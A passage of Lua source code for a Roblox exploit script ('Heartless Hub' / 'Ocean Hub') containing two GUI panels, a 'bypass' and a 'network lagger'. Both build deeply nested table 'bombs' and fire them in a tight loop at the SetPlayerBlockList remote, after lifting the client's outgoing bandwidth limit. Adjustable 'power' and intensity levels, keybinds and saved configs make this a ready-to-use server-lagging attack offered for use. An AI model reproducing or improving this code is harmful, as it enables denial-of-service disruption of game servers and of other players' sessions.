        ActivateBtn.Position = UDim2.new(0, 0, 1, -6)
        ActivateBtn.Size = UDim2.new(1, 0, 0, 30)
        ActivateBtn.BackgroundColor3 = C.plate
        ActivateBtn.Font = Enum.Font.GothamBlack
        ActivateBtn.Text = "ENGAGE RELAY"
        ActivateBtn.TextSize = 13
        ActivateBtn.TextColor3 = C.text
        ActivateBtn.AutoButtonColor = false
        ActivateBtn.ZIndex = 14
        corner(ActivateBtn, 11)
        local ActStroke = stroke(ActivateBtn, C.accent, 1.3, 0.28)

        -- minimizable pill (draggable)
        local Mini = Instance.new("TextButton", ScreenGui)
        Mini.Name = "Mini"
        Mini.Size = UDim2.fromOffset(120, 30)
        Mini.Position = UDim2.new(0.5, -74, 0.08, 0)
        Mini.BackgroundColor3 = C.void
        Mini.BorderSizePixel = 0
        Mini.Visible = false
        Mini.Font = Enum.Font.GothamBold
        Mini.Text = "◇  NODE"
        Mini.TextSize = 12
        Mini.TextColor3 = C.soft
        Mini.AutoButtonColor = false
        Mini.ZIndex = 20
        Mini.Active = true
        corner(Mini, 17)
        stroke(Mini, C.accent, 1.2, 0.35)

        -- STATE
        local running, bomb, spamThread = false, nil, nil
        local currentMode = Config.Mode
        local SPAM_DELAY = 0.12
        local minimized, listeningForKey = false, false

        local function formatPower(n)
            n = math.floor(tonumber(n) or 0)
            if n >= 1000 then return tostring(math.floor(n / 1000 + 0.5)) .. "K" end
            return tostring(n)
        end
        local function getCurrentPower()
            return currentMode == "PC" and Config.PCPower or Config.MobilePower
        end
        local function refreshPowerDisplay()
            PowerDisplay.Text = formatPower(getCurrentPower())
        end
        local function restartSpam()
            if not running then return end
            if spamThread then pcall(function() task.cancel(spamThread) end) end
            bomb = buildBomb(getCurrentPower())
            spamThread = task.spawn(function()
                while running and _obRunning do
                    if bomb then
                        pcall(function()
                            game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
                        end)
                    end
                    task.wait(SPAM_DELAY)
                end
            end)
            _obSpamThread = spamThread
        end
        local function setPower(val)
            val = math.clamp(math.floor(tonumber(val) or getCurrentPower()), 10000, currentMode == "PC" and 150000 or 100000)
            if currentMode == "PC" then Config.PCPower = val else Config.MobilePower = val end
            refreshPowerDisplay()
            SaveConfig()
            if running then restartSpam() end
        end
        local function updateModeVisuals()
            if currentMode == "PC" then
                PCBtn.BackgroundColor3 = C.accent; PCBtn.TextColor3 = txtOn(C.accent)
                MobileBtn.BackgroundColor3 = C.plate; MobileBtn.TextColor3 = C.soft
            else
                MobileBtn.BackgroundColor3 = C.accent; MobileBtn.TextColor3 = txtOn(C.accent)
                PCBtn.BackgroundColor3 = C.plate; PCBtn.TextColor3 = C.soft
            end
            refreshPowerDisplay()
        end
        local function updateToggleVisuals(on)
            if on then
                ActivateBtn.Text = "DISENGAGE"
                ActivateBtn.BackgroundColor3 = C.accent
                ActivateBtn.TextColor3 = txtOn(C.accent)
                ActStroke.Transparency = 0.08
                StatusLbl.Text = "RELAY  ·  LIVE"
                StatusLbl.TextColor3 = C.live
                Mini.Text = "◇  LIVE"
                Mini.TextColor3 = C.live
            else
                ActivateBtn.Text = "ENGAGE RELAY"
                ActivateBtn.BackgroundColor3 = C.plate
                ActivateBtn.TextColor3 = C.text
                ActStroke.Transparency = 0.28
                StatusLbl.Text = "RELAY  ·  STANDBY"
                StatusLbl.TextColor3 = C.dim
                Mini.Text = "◇  NODE"
                Mini.TextColor3 = C.soft
            end
        end
        local function ToggleBypass()
            running = not running
            _obRunning = running
            if running then
                pcall(function()
                    if NetworkClient and NetworkClient.SetOutgoingKBPSLimit then
                        NetworkClient:SetOutgoingKBPSLimit(math.huge)
                    end
                end)
                restartSpam()
            else
                if spamThread then pcall(function() task.cancel(spamThread) end); spamThread = nil end
                _obSpamThread = nil
                bomb = nil
                pcall(function()
                    if NetworkClient and NetworkClient.SetOutgoingKBPSLimit then
                        NetworkClient:SetOutgoingKBPSLimit(0)
                    end
                end)
            end
            updateToggleVisuals(running)
        end

        PCBtn.MouseButton1Click:Connect(function()
            currentMode = "PC"; Config.Mode = "PC"; updateModeVisuals(); SaveConfig()
            if running then restartSpam() end
        end)
        MobileBtn.MouseButton1Click:Connect(function()
            currentMode = "Mobile"; Config.Mode = "Mobile"; updateModeVisuals(); SaveConfig()
            if running then restartSpam() end
        end)
        ActivateBtn.MouseButton1Click:Connect(function()
            ToggleBypass()
        end)
        MinusBig.MouseButton1Click:Connect(function() setPower(getCurrentPower() - 10000) end)
        MinusSm.MouseButton1Click:Connect(function() setPower(getCurrentPower() - 1000) end)
        PlusSm.MouseButton1Click:Connect(function() setPower(getCurrentPower() + 1000) end)
        PlusBig.MouseButton1Click:Connect(function() setPower(getCurrentPower() + 10000) end)

        local function beginEditPower()
            PowerInput.TextTransparency = 0
            PowerDisplay.TextTransparency = 1
            PowerInput.Text = tostring(getCurrentPower())
            PowerInput:CaptureFocus()
        end
        PowerDisplay.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                beginEditPower()
            end
        end)
        core.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                beginEditPower()
            end
        end)
        PowerInput.FocusLost:Connect(function()
            local n = tonumber((PowerInput.Text or ""):gsub("[Kk]", "000"):gsub("%D", ""))
            if n then setPower(n) end
            PowerInput.TextTransparency = 1
            PowerDisplay.TextTransparency = 0
            refreshPowerDisplay()
        end)

        KeybindBtn.MouseButton1Click:Connect(function()
            listeningForKey = true
            KeybindBtn.Text = "PRESS A KEY…"
            KeybindBtn.TextColor3 = C.warn
            KeybindStroke.Color = C.warn
        end)

        hideBtn.MouseButton1Click:Connect(function()
            minimized = true
            Main.Visible = false
            Mini.Visible = true
            Mini.Position = UDim2.new(Main.Position.X.Scale, Main.Position.X.Offset - 74, Main.Position.Y.Scale, Main.Position.Y.Offset - 200)
        end)
        Mini.MouseButton1Click:Connect(function()
            -- only expand if not dragging (handled below)
            if Mini:GetAttribute("WasDragging") then
                Mini:SetAttribute("WasDragging", false)
                return
            end
            minimized = false
            Mini.Visible = false
            Main.Visible = true
        end)

        UserInputService.InputBegan:Connect(function(input, processed)
            if processed then return end
            if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
            if input.KeyCode == Enum.KeyCode.LeftControl then
                if Main.Visible or Mini.Visible then
                    Main.Visible = false; Mini.Visible = false
                else
                    if minimized then Mini.Visible = true else Main.Visible = true end
                end
                return
            end
            if listeningForKey then
                Config.Keybind = input.KeyCode.Name
                KeybindBtn.Text = "BIND  ·  " .. Config.Keybind
                KeybindBtn.TextColor3 = C.soft
                KeybindStroke.Color = C.line
                listeningForKey = false
                SaveConfig()
                return
            end
            if input.KeyCode.Name == Config.Keybind then ToggleBypass() end
        end)

        -- drag main
        local dragging, dragStart, startPos, dragTarget = false, nil, nil, nil
        local function beginDrag(input, frame)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragTarget = frame
                dragStart = input.Position
                startPos = frame.Position
                if frame == Mini then frame:SetAttribute("WasDragging", false) end
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                        dragTarget = nil
                    end
                end)
            end
        end
        Header.InputBegan:Connect(function(input) beginDrag(input, Main) end)
        Mini.InputBegan:Connect(function(input) beginDrag(input, Mini) end)
        UserInputService.InputChanged:Connect(function(input)
            if not dragging or not dragTarget then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local d = input.Position - dragStart
                if math.abs(d.X) + math.abs(d.Y) > 4 and dragTarget == Mini then
                    dragTarget:SetAttribute("WasDragging", true)
                end
                dragTarget.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)

        pcall(function()
            if registerAccentHook then
                registerAccentHook(function(a)
                    C.accent = a
                    MainStroke.Color = a
                    ribbon.BackgroundColor3 = a
                    badgeTxt.TextColor3 = a
                    ActStroke.Color = a
                    if running then
                        ActivateBtn.BackgroundColor3 = a
                        ActivateBtn.TextColor3 = txtOn(a)
                    end
                    updateModeVisuals()
                    paintFxBtns()
                end, Main)
            end
        end)

        updateModeVisuals()
        updateToggleVisuals(false)
        KeybindBtn.Text = "BIND  ·  " .. tostring(Config.Keybind)
        refreshPowerDisplay()
        print("[Heartless Hub] Bypass loaded")
    end)
end

-- ============================================================
-- OCEAN HUB LAGGER (no intro) — themed like main hub
-- ============================================================
local _olGui, _olRunning, _olThread = nil, false, nil

function stopOceanLagger()
    _olRunning = false
    if _olThread then
        pcall(function() task.cancel(_olThread) end)
        _olThread = nil
    end
    pcall(function()
        local nc = game:GetService("NetworkClient")
        if nc and nc.SetOutgoingKBPSLimit then nc:SetOutgoingKBPSLimit(0) end
    end)
    local function wipe(root)
        if not root then return end
        local g = root:FindFirstChild("HeartlessLagger")
        if g then pcall(function() g:Destroy() end) end
    end
    pcall(function() wipe(game:GetService("CoreGui")) end)
    pcall(function() if gethui then wipe(gethui()) end end)
    pcall(function()
        local lp = game:GetService("Players").LocalPlayer
        if lp then wipe(lp:FindFirstChild("PlayerGui")) end
    end)
    pcall(function() if _olGui and _olGui.Parent then _olGui:Destroy() end end)
    _olGui = nil
end

function startOceanLagger()
    stopOceanLagger()
    task.spawn(function()
        repeat task.wait() until game:IsLoaded()
        local Players = game:GetService("Players")
        local UserInputService = game:GetService("UserInputService")
        local TweenService = game:GetService("TweenService")
        local CoreGui = game:GetService("CoreGui")
        local HttpService = game:GetService("HttpService")
        local Stats = game:GetService("Stats")
        local LP = Players.LocalPlayer
        local PlayerGui = LP:WaitForChild("PlayerGui", 10)
        if not PlayerGui then return end

        local ConfigFile = "OceanHubLaggerConfig.json"
        local NIVELES = {
            Low = { poder = 23 },
            Mid = { poder = 32 },
            High = { poder = 70 },
            Ultra = { poder = 90 },
        }
        local ORDER = { "Low", "Mid", "High", "Ultra" }
        local keybind = Enum.KeyCode.M
        local listeningForInput = false
        local laggerActive = false
        local lagThread = nil
        local nivelActual = "Low"
        local ventanaBloqueada = false
        local minimized = false

        local ACC = ACCENT_COLOR or Color3.fromRGB(56, 140, 255)
        local function txtOn(a)
            a = a or ACC
            local lum = 0.299 * a.R + 0.587 * a.G + 0.114 * a.B
            return lum > 0.6 and Color3.fromRGB(12, 12, 16) or Color3.fromRGB(255, 255, 255)
        end
        local C = {
            BG = Color3.fromRGB(12, 12, 16),
            Surface = Color3.fromRGB(16, 16, 22),
            Card = Color3.fromRGB(20, 20, 28),
            Accent = ACC,
            Text = Color3.fromRGB(240, 242, 250),
            Muted = Color3.fromRGB(120, 125, 140),
            Line = Color3.fromRGB(40, 42, 55),
            Green = Color3.fromRGB(45, 210, 110),
            Yellow = Color3.fromRGB(255, 200, 50),
            Danger = Color3.fromRGB(230, 60, 70),
        }

        local function corner(p, r)
            local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 12); c.Parent = p; return c
        end
        local function stroke(p, col, th, tr)
            local s = Instance.new("UIStroke")
            s.Color = col or C.Line; s.Thickness = th or 1
            s.Transparency = tr or 0.4; s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            s.Parent = p; return s
        end

        local function SaveConfig()
            pcall(function()
                if writefile then
                    writefile(ConfigFile, HttpService:JSONEncode({
                        Nivel = nivelActual, Bloqueado = ventanaBloqueada, Key = keybind.Name
                    }))
                end
            end)
        end
        pcall(function()
            if isfile and isfile(ConfigFile) then
                local data = HttpService:JSONDecode(readfile(ConfigFile))
                nivelActual = data.Nivel or "Low"
                ventanaBloqueada = data.Bloqueado or false
                if data.Key and Enum.KeyCode[data.Key] then keybind = Enum.KeyCode[data.Key] end
            end
        end)

        local cachedBomb, cachedPower = nil, nil
        local function buildBomb(poder)
            local main, spam = {}, {{}}
            local z = spam[1]
            for i = 1, 25 do local t = {}; table.insert(z, t); z = t end
            local max = math.min(12000, poder * 50)
            for i = 1, max do table.insert(main, spam) end
            return main
        end
        local function fireBomb()
            if not cachedBomb or cachedPower ~= NIVELES[nivelActual].poder then
                cachedPower = NIVELES[nivelActual].poder
                cachedBomb = buildBomb(cachedPower)
            end
            pcall(function()
                game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(cachedBomb)
            end)
        end

        pcall(function()
            if CoreGui:FindFirstChild("HeartlessLagger") then CoreGui.HeartlessLagger:Destroy() end
            if PlayerGui:FindFirstChild("HeartlessLagger") then PlayerGui.HeartlessLagger:Destroy() end
            if gethui then
                local e = gethui():FindFirstChild("HeartlessLagger")
                if e then e:Destroy() end
            end
        end)

        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "OceanHubLagger"
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screenGui.ResetOnSpawn = false
        screenGui.IgnoreGuiInset = true
        screenGui.DisplayOrder = 50
        pcall(function() if syn and syn.protect_gui then syn.protect_gui(screenGui) end end)
        parentGui(screenGui)
        _olGui = screenGui

        local W, H, HEADER_H = 300, 210, 44
        local main = Instance.new("Frame", screenGui)
        main.Name = "MainFrame"
        main.Size = UDim2.fromOffset(W, H)
        main.Position = (guiPositionsSaved and UDim2.new(laggerPosSX or 0.12, laggerPosOX or 0, laggerPosSY or 0.55, laggerPosOY or 0)) or UDim2.new(0.12, 0, 0.55, -H / 2)
        _olMainRef = main
        pcall(function() applyLaggerPosition(main) end)
        main.BackgroundColor3 = C.BG
        main.BackgroundTransparency = 0.02
        main.BorderSizePixel = 0
        main.ClipsDescendants = true
        main.Active = true
        corner(main, 18)
        local mainStroke = stroke(main, C.Accent, 1.6, 0.3)

        -- background (same as hub)
        local bgImg = Instance.new("ImageLabel", main)
        bgImg.Size = UDim2.fromScale(1, 1)
        bgImg.BackgroundTransparency = 1
        bgImg.ScaleType = Enum.ScaleType.Crop
        bgImg.ImageTransparency = 0.22
        bgImg.ZIndex = 0
        corner(bgImg, 18)
        do
            local id = tostring(customBgId or ""):gsub("%s+", ""):gsub("rbxassetid://", "")
            if id == "" then
                id = tostring(DEFAULT_BG_ID or THEME_BG_IMAGE_ID or "77425942502589"):gsub("rbxassetid://", "")
            end
            id = id:match("(%d+)") or "77425942502589"
            pcall(function()
                if themeBgFrame and themeBgFrame.Parent and themeBgFrame.Image ~= "" then
                    bgImg.Image = themeBgFrame.Image
                else
                    bgImg.Image = "rbxthumb://type=Asset&id=" .. id .. "&w=420&h=420"
                end
            end)
        end
        local veil = Instance.new("Frame", main)
        veil.Size = UDim2.fromScale(1, 1)
        veil.BackgroundColor3 = Color3.fromRGB(8, 10, 16)
        veil.BackgroundTransparency = 0.28
        veil.BorderSizePixel = 0
        veil.ZIndex = 0
        corner(veil, 18)

        -- top accent bar
        local topBar = Instance.new("Frame", main)
        topBar.Size = UDim2.new(1, 0, 0, 3)
        topBar.BackgroundColor3 = C.Accent
        topBar.BorderSizePixel = 0
        topBar.ZIndex = 6
        local topGrad = Instance.new("UIGradient", topBar)
        topGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(0.5, C.Accent),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
        })
        task.spawn(function()
            while topGrad and topGrad.Parent do
                topGrad.Offset = Vector2.new((math.sin(tick() * 1.2) * 0.5), 0)
                task.wait(0.04)
            end
        end)

        -- HEADER
        local header = Instance.new("Frame", main)
        header.Name = "Header"
        header.Size = UDim2.new(1, 0, 0, HEADER_H)
        header.BackgroundTransparency = 1
        header.ZIndex = 5

        local badge = Instance.new("Frame", header)
        badge.Size = UDim2.fromOffset(28, 28)
        badge.Position = UDim2.fromOffset(12, 8)
        badge.BackgroundColor3 = C.Accent
        badge.BorderSizePixel = 0
        badge.ZIndex = 5
        corner(badge, 8)
        local badgeTxt = Instance.new("TextLabel", badge)
        badgeTxt.BackgroundTransparency = 1
        badgeTxt.Size = UDim2.fromScale(1, 1)
        badgeTxt.Font = Enum.Font.GothamBlack
        badgeTxt.Text = "OH"
        badgeTxt.TextSize = 11
        badgeTxt.TextColor3 = txtOn(C.Accent)
        badgeTxt.ZIndex = 6

        local title = Instance.new("TextLabel", header)
        title.BackgroundTransparency = 1
        title.Position = UDim2.fromOffset(48, 6)
        title.Size = UDim2.fromOffset(170, 18)
        title.Font = Enum.Font.GothamBlack
        title.Text = "OCEAN HUB"
        title.TextSize = 14
        title.TextColor3 = C.Text
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.ZIndex = 5

        local subtitle = Instance.new("TextLabel", header)
        subtitle.BackgroundTransparency = 1
        subtitle.Position = UDim2.fromOffset(48, 24)
        subtitle.Size = UDim2.fromOffset(170, 14)
        subtitle.Font = Enum.Font.GothamMedium
        subtitle.Text = "network lagger"
        subtitle.TextSize = 11
        subtitle.TextColor3 = C.Muted
        subtitle.TextXAlignment = Enum.TextXAlignment.Left
        subtitle.ZIndex = 5

        local minBtn = Instance.new("TextButton", header)
        minBtn.Size = UDim2.fromOffset(26, 26)
        minBtn.Position = UDim2.new(1, -38, 0, 9)
        minBtn.BackgroundColor3 = C.Card
        minBtn.BackgroundTransparency = 0.15
        minBtn.Text = "–"
        minBtn.Font = Enum.Font.GothamBlack
        minBtn.TextSize = 16
        minBtn.TextColor3 = C.Muted
        minBtn.AutoButtonColor = false
        minBtn.ZIndex = 6
        corner(minBtn, 8)
        stroke(minBtn, C.Line, 1, 0.35)

        -- BODY
        local body = Instance.new("Frame", main)
        body.Name = "Body"
        body.Position = UDim2.fromOffset(0, HEADER_H)
        body.Size = UDim2.new(1, 0, 1, -HEADER_H)
        body.BackgroundTransparency = 1
        body.ZIndex = 4
        body.ClipsDescendants = true

        -- big status / power card
        local hero = Instance.new("Frame", body)
        hero.Position = UDim2.fromOffset(12, 6)
        hero.Size = UDim2.new(1, -24, 0, 56)
        hero.BackgroundColor3 = C.Surface
        hero.BackgroundTransparency = 0.15
        hero.BorderSizePixel = 0
        hero.ZIndex = 4
        corner(hero, 14)
        stroke(hero, C.Accent, 1, 0.55)

        local statusPill = Instance.new("Frame", hero)
        statusPill.Size = UDim2.fromOffset(64, 22)
        statusPill.Position = UDim2.fromOffset(12, 8)
        statusPill.BackgroundColor3 = C.Card
        statusPill.BorderSizePixel = 0
        statusPill.ZIndex = 5
        corner(statusPill, 8)
        local statusDot = Instance.new("Frame", statusPill)
        statusDot.Size = UDim2.fromOffset(7, 7)
        statusDot.Position = UDim2.fromOffset(8, 7.5)
        statusDot.BackgroundColor3 = C.Muted
        statusDot.BorderSizePixel = 0
        statusDot.ZIndex = 6
        corner(statusDot, 99)
        local statusLbl = Instance.new("TextLabel", statusPill)
        statusLbl.BackgroundTransparency = 1
        statusLbl.Position = UDim2.fromOffset(18, 0)
        statusLbl.Size = UDim2.new(1, -20, 1, 0)
        statusLbl.Font = Enum.Font.GothamBold
        statusLbl.Text = "IDLE"
        statusLbl.TextSize = 10
        statusLbl.TextColor3 = C.Muted
        statusLbl.TextXAlignment = Enum.TextXAlignment.Left
        statusLbl.ZIndex = 6

        local powerBig = Instance.new("TextLabel", hero)
        powerBig.BackgroundTransparency = 1
        powerBig.Position = UDim2.fromOffset(12, 28)
        powerBig.Size = UDim2.fromOffset(140, 22)
        powerBig.Font = Enum.Font.GothamBlack
        powerBig.Text = "POWER  23"
        powerBig.TextSize = 16
        powerBig.TextColor3 = C.Text
        powerBig.TextXAlignment = Enum.TextXAlignment.Left
        powerBig.ZIndex = 5

        local pingLbl = Instance.new("TextLabel", hero)
        pingLbl.BackgroundTransparency = 1
        pingLbl.Position = UDim2.new(1, -90, 0, 8)
        pingLbl.Size = UDim2.fromOffset(78, 18)
        pingLbl.Font = Enum.Font.GothamBold
        pingLbl.Text = "0 ms"
        pingLbl.TextSize = 11
        pingLbl.TextColor3 = C.Muted
        pingLbl.TextXAlignment = Enum.TextXAlignment.Right
        pingLbl.ZIndex = 5
        task.spawn(function()
            while pingLbl and pingLbl.Parent do
                local ping = 0
                pcall(function()
                    ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
                end)
                pingLbl.Text = ping .. " ms"
                pingLbl.TextColor3 = ping > 400 and C.Danger or (ping > 150 and C.Yellow or C.Green)
                task.wait(1)
            end
        end)

        -- main ON button (large)
        local goBtn = Instance.new("TextButton", hero)
        goBtn.Size = UDim2.fromOffset(88, 36)
        goBtn.Position = UDim2.new(1, -100, 0.5, -18)
        goBtn.BackgroundColor3 = C.Card
        goBtn.BorderSizePixel = 0
        goBtn.Font = Enum.Font.GothamBlack
        goBtn.Text = "START"
        goBtn.TextSize = 13
        goBtn.TextColor3 = C.Text
        goBtn.AutoButtonColor = false
        goBtn.ZIndex = 5
        corner(goBtn, 10)
        local goStroke = stroke(goBtn, C.Accent, 1.2, 0.35)

        -- level chips
        local levelTitle = Instance.new("TextLabel", body)
        levelTitle.BackgroundTransparency = 1
        levelTitle.Position = UDim2.fromOffset(16, 68)
        levelTitle.Size = UDim2.fromOffset(120, 14)
        levelTitle.Font = Enum.Font.GothamBold
        levelTitle.Text = "INTENSITY"
        levelTitle.TextSize = 10
        levelTitle.TextColor3 = C.Muted
        levelTitle.TextXAlignment = Enum.TextXAlignment.Left
        levelTitle.ZIndex = 4

        local levelRow = Instance.new("Frame", body)
        levelRow.Position = UDim2.fromOffset(12, 86)
        levelRow.Size = UDim2.new(1, -24, 0, 34)
        levelRow.BackgroundTransparency = 1
        levelRow.ZIndex = 4
        local list = Instance.new("UIListLayout", levelRow)
        list.FillDirection = Enum.FillDirection.Horizontal
        list.Padding = UDim.new(0, 6)
        list.HorizontalAlignment = Enum.HorizontalAlignment.Center

        local levelColors = {
            Low = C.Green,
            Mid = C.Yellow,
            High = C.Accent,
            Ultra = Color3.fromRGB(255, 255, 255),
        }
        local btns = {}
        for _, name in ipairs(ORDER) do
            local b = Instance.new("TextButton", levelRow)
            b.Size = UDim2.new(0.25, -5, 1, 0)
            b.BackgroundColor3 = C.Card
            b.BackgroundTransparency = 0.1
            b.Font = Enum.Font.GothamBlack
            b.Text = name:upper()
            b.TextSize = 11
            b.TextColor3 = C.Muted
            b.AutoButtonColor = false
            b.BorderSizePixel = 0
            b.ZIndex = 5
            corner(b, 10)
            local st = stroke(b, C.Line, 1, 0.4)
            btns[name] = { btn = b, stroke = st }
        end

        local tip = Instance.new("TextLabel", body)
        tip.BackgroundTransparency = 1
        tip.Position = UDim2.fromOffset(12, 124)
        tip.Size = UDim2.new(1, -24, 0, 12)
        tip.Font = Enum.Font.GothamMedium
        tip.Text = ""
        tip.TextSize = 10
        tip.TextColor3 = C.Accent
        tip.TextXAlignment = Enum.TextXAlignment.Center
        tip.ZIndex = 4

        -- footer tools
        local footer = Instance.new("Frame", body)
        footer.Position = UDim2.new(0, 12, 1, -40)
        footer.Size = UDim2.new(1, -24, 0, 30)
        footer.BackgroundColor3 = C.Surface
        footer.BackgroundTransparency = 0.2
        footer.BorderSizePixel = 0
        footer.ZIndex = 4
        corner(footer, 12)
        stroke(footer, C.Line, 1, 0.45)

        local keyBtn = Instance.new("TextButton", footer)
        keyBtn.Position = UDim2.fromOffset(6, 4)
        keyBtn.Size = UDim2.fromOffset(90, 22)
        keyBtn.BackgroundColor3 = C.Card
        keyBtn.BackgroundTransparency = 0.1
        keyBtn.Font = Enum.Font.GothamBold
        keyBtn.Text = "KEY  M"
        keyBtn.TextSize = 11
        keyBtn.TextColor3 = C.Muted
        keyBtn.AutoButtonColor = false
        keyBtn.ZIndex = 5
        corner(keyBtn, 8)

        local lockBtn = Instance.new("TextButton", footer)
        lockBtn.Position = UDim2.fromOffset(102, 4)
        lockBtn.Size = UDim2.fromOffset(78, 22)
        lockBtn.BackgroundColor3 = C.Card
        lockBtn.BackgroundTransparency = 0.1
        lockBtn.Font = Enum.Font.GothamBold
        lockBtn.Text = "UNLOCK"
        lockBtn.TextSize = 11
        lockBtn.TextColor3 = C.Muted
        lockBtn.AutoButtonColor = false
        lockBtn.ZIndex = 5
        corner(lockBtn, 8)

        local brand = Instance.new("TextLabel", footer)
        brand.BackgroundTransparency = 1
        brand.Position = UDim2.new(1, -100, 0, 0)
        brand.Size = UDim2.fromOffset(94, 30)
        brand.Font = Enum.Font.GothamBold
        brand.Text = "ocean"
        brand.TextSize = 11
        brand.TextColor3 = C.Muted
        brand.TextXAlignment = Enum.TextXAlignment.Right
        brand.ZIndex = 5

        local function paintLevels()
            for _, name in ipairs(ORDER) do
                local e = btns[name]
                local on = name == nivelActual
                local col = levelColors[name]
                if on then
                    e.btn.BackgroundColor3 = col
                    e.btn.BackgroundTransparency = 0.05
                    e.btn.TextColor3 = (name == "Ultra") and Color3.fromRGB(12, 12, 16) or C.Text
                    e.stroke.Color = col
                    e.stroke.Transparency = 0.1
                else
                    e.btn.BackgroundColor3 = C.Card
                    e.btn.BackgroundTransparency = 0.1
                    e.btn.TextColor3 = C.Muted
                    e.stroke.Color = C.Line
                    e.stroke.Transparency = 0.4
                end
            end
            powerBig.Text = "POWER  " .. tostring(NIVELES[nivelActual].poder)
            tip.Text = (nivelActual == "Ultra") and "only for tryhards" or ""
            cachedBomb = nil
        end

        local function paintLock()
            lockBtn.Text = ventanaBloqueada and "LOCKED" or "UNLOCK"
            lockBtn.TextColor3 = ventanaBloqueada and C.Accent or C.Muted
        end
        local function paintKey()
            keyBtn.Text = "KEY  " .. keybind.Name:gsub("Button", "")
        end

        local function setRunningVisual(on)
            if on then
                goBtn.Text = "STOP"
                goBtn.BackgroundColor3 = C.Accent
                goBtn.TextColor3 = txtOn(C.Accent)
                goStroke.Color = C.Accent
                goStroke.Transparency = 0.1
                statusLbl.Text = "LIVE"
                statusLbl.TextColor3 = C.Green
                statusDot.BackgroundColor3 = C.Green
            else
                goBtn.Text = "START"
                goBtn.BackgroundColor3 = C.Card
                goBtn.TextColor3 = C.Text
                goStroke.Color = C.Accent
                goStroke.Transparency = 0.35
                statusLbl.Text = "IDLE"
                statusLbl.TextColor3 = C.Muted
                statusDot.BackgroundColor3 = C.Muted
            end
        end

        local function toggleLagger()
            laggerActive = not laggerActive
            _olRunning = laggerActive
            setRunningVisual(laggerActive)
            if laggerActive then
                if lagThread then pcall(function() task.cancel(lagThread) end) end
                lagThread = task.spawn(function()
                    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
                    while laggerActive and _olGui and _olGui.Parent do
                        fireBomb()
                        task.wait(0.18)
                    end
                    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
                end)
                _olThread = lagThread
            else
                if lagThread then pcall(function() task.cancel(lagThread) end); lagThread = nil end
                _olThread = nil
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
            end
        end

        goBtn.MouseButton1Click:Connect(toggleLagger)
        for _, name in ipairs(ORDER) do
            btns[name].btn.MouseButton1Click:Connect(function()
                nivelActual = name
                paintLevels()
                SaveConfig()
            end)
        end
        lockBtn.MouseButton1Click:Connect(function()
            ventanaBloqueada = not ventanaBloqueada
            paintLock()
            SaveConfig()
        end)
        keyBtn.MouseButton1Click:Connect(function()
            if listeningForInput then return end
            listeningForInput = true
            keyBtn.Text = "PRESS..."
            keyBtn.TextColor3 = C.Accent
        end)

        local function setMinimized(on)
            minimized = on
            minBtn.Text = on and "+" or "–"
            body.Visible = not on
            TweenService:Create(main, TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = on and UDim2.fromOffset(W, HEADER_H) or UDim2.fromOffset(W, H)
            }):Play()
        end
        minBtn.MouseButton1Click:Connect(function()
            setMinimized(not minimized)
        end)

        paintLevels()
        paintLock()
        paintKey()
        setRunningVisual(false)

        UserInputService.InputBegan:Connect(function(input, gp)
            if gp or not screenGui.Parent then return end
            if listeningForInput then
                if input.KeyCode ~= Enum.KeyCode.Unknown then
                    keybind = input.KeyCode
                    listeningForInput = false
                    paintKey()
                    keyBtn.TextColor3 = C.Muted
                    SaveConfig()
                end
                return
            end
            if input.KeyCode == keybind then toggleLagger() end
        end)

        local dragging, d0, p0 = false, nil, nil
        header.InputBegan:Connect(function(input)
            if ventanaBloqueada then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true; d0 = input.Position; p0 = main.Position
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if not dragging or ventanaBloqueada then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local d = input.Position - d0
                main.Position = UDim2.new(p0.X.Scale, p0.X.Offset + d.X, p0.Y.Scale, p0.Y.Offset + d.Y)
            end
        end)
        UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)

        main.Size = UDim2.fromOffset(W, 0)
        TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UDim2.fromOffset(W, H)
        }):Play()

        pcall(function()
            if registerAccentHook then
                registerAccentHook(function(a)
                    C.Accent = a
                    mainStroke.Color = a
                    topBar.BackgroundColor3 = a
                    badge.BackgroundColor3 = a
                    badgeTxt.TextColor3 = txtOn(a)
                    if not laggerActive then
                        goStroke.Color = a
                    else
                        goBtn.BackgroundColor3 = a
                        goBtn.TextColor3 = txtOn(a)
                    end
                    paintLevels()
                end, main)
            end
        end)

        print("[Ocean Hub] Lagger panel loaded")
    end)
end




-- Ocean Owner tags: always show "Ocean Owner" above hub owners in-server
